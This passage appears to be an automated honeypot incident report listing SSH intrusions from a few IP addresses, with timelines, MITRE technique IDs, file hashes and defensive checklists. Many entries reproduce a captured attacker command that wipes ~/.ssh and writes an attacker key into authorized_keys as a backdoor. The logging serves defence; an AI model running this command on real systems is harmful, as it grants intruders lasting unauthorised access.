| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:37 |
| **Last Seen** | 2026-04-17 03:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:37:59` | `cowrie.session.connect` |
| `2026-04-17 03:37:59` | `cowrie.client.version` |
| `2026-04-17 03:37:59` | `cowrie.client.kex` |
| `2026-04-17 03:38:00` | `cowrie.login.success` |
| `2026-04-17 03:38:00` | `cowrie.session.params` |
| `2026-04-17 03:38:00` | `cowrie.command.input` |
| `2026-04-17 03:38:00` | `cowrie.command.failed` |
| `2026-04-17 03:38:00` | `cowrie.log.closed` |
| `2026-04-17 03:38:00` | `cowrie.session.params` |
| `2026-04-17 03:38:00` | `cowrie.command.input` |
| `2026-04-17 03:38:00` | `cowrie.session.file_download` |
| `2026-04-17 03:38:00` | `cowrie.log.closed` |
| `2026-04-17 03:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5512bd92a4de

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:38 |
| **Last Seen** | 2026-04-17 03:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:38:03` | `cowrie.session.connect` |
| `2026-04-17 03:38:03` | `cowrie.client.version` |
| `2026-04-17 03:38:03` | `cowrie.client.kex` |
| `2026-04-17 03:38:03` | `cowrie.login.success` |
| `2026-04-17 03:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faab83355d1e

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:39 |
| **Last Seen** | 2026-04-17 03:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:39:31` | `cowrie.session.connect` |
| `2026-04-17 03:39:31` | `cowrie.client.version` |
| `2026-04-17 03:39:31` | `cowrie.client.kex` |
| `2026-04-17 03:39:32` | `cowrie.login.success` |
| `2026-04-17 03:39:32` | `cowrie.session.params` |
| `2026-04-17 03:39:32` | `cowrie.command.input` |
| `2026-04-17 03:39:32` | `cowrie.command.failed` |
| `2026-04-17 03:39:32` | `cowrie.log.closed` |
| `2026-04-17 03:39:32` | `cowrie.session.params` |
| `2026-04-17 03:39:32` | `cowrie.command.input` |
| `2026-04-17 03:39:32` | `cowrie.session.file_download` |
| `2026-04-17 03:39:32` | `cowrie.log.closed` |
| `2026-04-17 03:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ad7a9476d32

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:39 |
| **Last Seen** | 2026-04-17 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:39:34` | `cowrie.session.connect` |
| `2026-04-17 03:39:34` | `cowrie.client.version` |
| `2026-04-17 03:39:34` | `cowrie.client.kex` |
| `2026-04-17 03:39:35` | `cowrie.login.success` |
| `2026-04-17 03:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47009992bcab

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:41 |
| **Last Seen** | 2026-04-17 03:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:41:06` | `cowrie.session.connect` |
| `2026-04-17 03:41:06` | `cowrie.client.version` |
| `2026-04-17 03:41:06` | `cowrie.client.kex` |
| `2026-04-17 03:41:07` | `cowrie.login.success` |
| `2026-04-17 03:41:07` | `cowrie.session.params` |
| `2026-04-17 03:41:07` | `cowrie.command.input` |
| `2026-04-17 03:41:07` | `cowrie.command.failed` |
| `2026-04-17 03:41:07` | `cowrie.log.closed` |
| `2026-04-17 03:41:07` | `cowrie.session.params` |
| `2026-04-17 03:41:07` | `cowrie.command.input` |
| `2026-04-17 03:41:07` | `cowrie.session.file_download` |
| `2026-04-17 03:41:07` | `cowrie.log.closed` |
| `2026-04-17 03:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe54a35cf5f

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:41 |
| **Last Seen** | 2026-04-17 03:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:41:09` | `cowrie.session.connect` |
| `2026-04-17 03:41:09` | `cowrie.client.version` |
| `2026-04-17 03:41:09` | `cowrie.client.kex` |
| `2026-04-17 03:41:10` | `cowrie.login.success` |
| `2026-04-17 03:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcbd974e34a2

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:42 |
| **Last Seen** | 2026-04-17 03:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:42:39` | `cowrie.session.connect` |
| `2026-04-17 03:42:39` | `cowrie.client.version` |
| `2026-04-17 03:42:39` | `cowrie.client.kex` |
| `2026-04-17 03:42:39` | `cowrie.login.success` |
| `2026-04-17 03:42:39` | `cowrie.session.params` |
| `2026-04-17 03:42:39` | `cowrie.command.input` |
| `2026-04-17 03:42:39` | `cowrie.command.failed` |
| `2026-04-17 03:42:39` | `cowrie.log.closed` |
| `2026-04-17 03:42:40` | `cowrie.session.params` |
| `2026-04-17 03:42:40` | `cowrie.command.input` |
| `2026-04-17 03:42:40` | `cowrie.session.file_download` |
| `2026-04-17 03:42:40` | `cowrie.log.closed` |
| `2026-04-17 03:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dbf884f5ab2

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:42 |
| **Last Seen** | 2026-04-17 03:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:42:41` | `cowrie.session.connect` |
| `2026-04-17 03:42:41` | `cowrie.client.version` |
| `2026-04-17 03:42:42` | `cowrie.client.kex` |
| `2026-04-17 03:42:42` | `cowrie.login.success` |
| `2026-04-17 03:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d51114edd953

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:44 |
| **Last Seen** | 2026-04-17 03:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:44:07` | `cowrie.session.connect` |
| `2026-04-17 03:44:07` | `cowrie.client.version` |
| `2026-04-17 03:44:07` | `cowrie.client.kex` |
| `2026-04-17 03:44:08` | `cowrie.login.success` |
| `2026-04-17 03:44:08` | `cowrie.session.params` |
| `2026-04-17 03:44:08` | `cowrie.command.input` |
| `2026-04-17 03:44:08` | `cowrie.command.failed` |
| `2026-04-17 03:44:08` | `cowrie.log.closed` |
| `2026-04-17 03:44:08` | `cowrie.session.params` |
| `2026-04-17 03:44:08` | `cowrie.command.input` |
| `2026-04-17 03:44:08` | `cowrie.session.file_download` |
| `2026-04-17 03:44:08` | `cowrie.log.closed` |
| `2026-04-17 03:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5277ec5c6700

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:44 |
| **Last Seen** | 2026-04-17 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:44:10` | `cowrie.session.connect` |
| `2026-04-17 03:44:10` | `cowrie.client.version` |
| `2026-04-17 03:44:10` | `cowrie.client.kex` |
| `2026-04-17 03:44:10` | `cowrie.login.success` |
| `2026-04-17 03:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-916659fff8fc

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:45 |
| **Last Seen** | 2026-04-17 03:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:45:17` | `cowrie.session.connect` |
| `2026-04-17 03:45:17` | `cowrie.client.version` |
| `2026-04-17 03:45:17` | `cowrie.client.kex` |
| `2026-04-17 03:45:18` | `cowrie.login.success` |
| `2026-04-17 03:45:18` | `cowrie.session.params` |
| `2026-04-17 03:45:18` | `cowrie.command.input` |
| `2026-04-17 03:45:18` | `cowrie.command.failed` |
| `2026-04-17 03:45:19` | `cowrie.log.closed` |
| `2026-04-17 03:45:19` | `cowrie.session.params` |
| `2026-04-17 03:45:19` | `cowrie.command.input` |
| `2026-04-17 03:45:19` | `cowrie.session.file_download` |
| `2026-04-17 03:45:19` | `cowrie.log.closed` |
| `2026-04-17 03:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d93c6039df

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:45 |
| **Last Seen** | 2026-04-17 03:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:45:21` | `cowrie.session.connect` |
| `2026-04-17 03:45:22` | `cowrie.client.version` |
| `2026-04-17 03:45:22` | `cowrie.client.kex` |
| `2026-04-17 03:45:22` | `cowrie.login.success` |
| `2026-04-17 03:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5725a02c29ed

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:45 |
| **Last Seen** | 2026-04-17 03:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:45:43` | `cowrie.session.connect` |
| `2026-04-17 03:45:43` | `cowrie.client.version` |
| `2026-04-17 03:45:43` | `cowrie.client.kex` |
| `2026-04-17 03:45:43` | `cowrie.login.success` |
| `2026-04-17 03:45:44` | `cowrie.session.params` |
| `2026-04-17 03:45:44` | `cowrie.command.input` |
| `2026-04-17 03:45:44` | `cowrie.command.failed` |
| `2026-04-17 03:45:44` | `cowrie.log.closed` |
| `2026-04-17 03:45:44` | `cowrie.session.params` |
| `2026-04-17 03:45:44` | `cowrie.command.input` |
| `2026-04-17 03:45:44` | `cowrie.session.file_download` |
| `2026-04-17 03:45:44` | `cowrie.log.closed` |
| `2026-04-17 03:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b26d54755b20

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:45 |
| **Last Seen** | 2026-04-17 03:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:45:46` | `cowrie.session.connect` |
| `2026-04-17 03:45:46` | `cowrie.client.version` |
| `2026-04-17 03:45:46` | `cowrie.client.kex` |
| `2026-04-17 03:45:46` | `cowrie.login.success` |
| `2026-04-17 03:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c731fbcbed4f

| Field | Detail |
|---|---|
| **Source IP** | `20.64.113[.]40` |
| **First Seen** | 2026-04-17 03:48 |
| **Last Seen** | 2026-04-17 03:49 |
| **Session Duration** | 81s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:48:11` | `cowrie.session.connect` |
| `2026-04-17 03:48:11` | `cowrie.client.version` |
| `2026-04-17 03:48:11` | `cowrie.client.kex` |
| `2026-04-17 03:48:12` | `cowrie.login.success` |
| `2026-04-17 03:49:32` | `cowrie.session.file_upload` |
| `2026-04-17 03:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.64.113[.]40` to AbuseIPDB if not already reported
- [ ] Block `20.64.113[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-861591174441

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:52 |
| **Last Seen** | 2026-04-17 03:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:52:04` | `cowrie.session.connect` |
| `2026-04-17 03:52:04` | `cowrie.client.version` |
| `2026-04-17 03:52:04` | `cowrie.client.kex` |
| `2026-04-17 03:52:04` | `cowrie.login.success` |
| `2026-04-17 03:52:04` | `cowrie.session.params` |
| `2026-04-17 03:52:04` | `cowrie.command.input` |
| `2026-04-17 03:52:04` | `cowrie.command.failed` |
| `2026-04-17 03:52:05` | `cowrie.log.closed` |
| `2026-04-17 03:52:05` | `cowrie.session.params` |
| `2026-04-17 03:52:05` | `cowrie.command.input` |
| `2026-04-17 03:52:05` | `cowrie.session.file_download` |
| `2026-04-17 03:52:05` | `cowrie.log.closed` |
| `2026-04-17 03:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2b7d615dc40

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:52 |
| **Last Seen** | 2026-04-17 03:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:52:07` | `cowrie.session.connect` |
| `2026-04-17 03:52:07` | `cowrie.client.version` |
| `2026-04-17 03:52:07` | `cowrie.client.kex` |
| `2026-04-17 03:52:07` | `cowrie.login.success` |
| `2026-04-17 03:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e4cbeaea34

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-04-17 03:57 |
| **Last Seen** | 2026-04-17 03:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
